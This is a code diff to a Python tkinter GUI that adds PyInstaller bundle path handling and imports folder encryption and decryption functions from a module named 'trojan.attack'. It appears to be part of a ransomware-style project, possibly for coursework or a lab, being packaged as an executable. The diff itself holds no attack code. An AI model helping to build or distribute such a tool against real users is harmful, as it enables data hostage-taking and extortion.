@@ -1,18 +1,25 @@
 import sys
 import os
+import tkinter
 import threading
 import tkinter as tk
 from tkinter import ttk, messagebox
 
-# Path setup to ensure we can import trojan.attack and its dependencies
-current_dir = os.path.dirname(os.path.abspath(__file__))
-parent_dir = os.path.dirname(current_dir)
-trojan_dir = os.path.join(parent_dir, "trojan")
+# Path setup for PyInstaller
+if hasattr(sys, '_MEIPASS'):
+    # In PyInstaller, sys._MEIPASS is the root of the bundle
+    ROOT_DIR = sys._MEIPASS
+    # For onedir, also check _internal
+    internal_dir = os.path.join(ROOT_DIR, "_internal")
+    if os.path.exists(internal_dir) and internal_dir not in sys.path:
+        sys.path.insert(0, internal_dir)
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    # When running from source, ROOT_DIR is the project root (one level up from BASE_DIR)
+    ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))
 
-if parent_dir not in sys.path:
-    sys.path.insert(0, parent_dir)
-if trojan_dir not in sys.path:
-    sys.path.insert(0, trojan_dir)
+if ROOT_DIR not in sys.path:
+    sys.path.insert(0, ROOT_DIR)
 
 # Import from Phase 1
 from trojan.attack import encrypt_folder, decrypt_folder, is_encrypted
